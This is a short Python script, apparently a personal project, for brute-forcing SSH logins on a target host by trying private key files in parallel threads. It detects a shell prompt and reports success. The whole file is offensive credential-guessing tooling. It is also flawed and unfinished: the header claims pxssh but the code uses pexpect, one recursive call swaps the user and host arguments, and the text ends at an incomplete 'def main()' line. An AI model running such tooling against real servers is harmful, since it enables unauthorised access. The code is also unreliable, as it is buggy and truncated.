#!/usr/bin/python
# author: axi0m
# purpose: ssh bruteforcer using pxssh instead of pexpect - More modular
# usage: sshBrute.py --host 10.10.10.10 --user root -F password.txt
# example: sshBrute.py
# changelog: 12/17/18 - initial creation
# changelog: 02/12/19 - finished working prototype

'''
To Do:
'''

import pexpect
import argparse
import os
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(host, user, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + \
                '@' + host + ' -i' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, \
                ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print('[-] Adding host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection closed by remote host')
            Fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            Stop = True
    finally:
        if release:
            connection_lock.release()


def main()
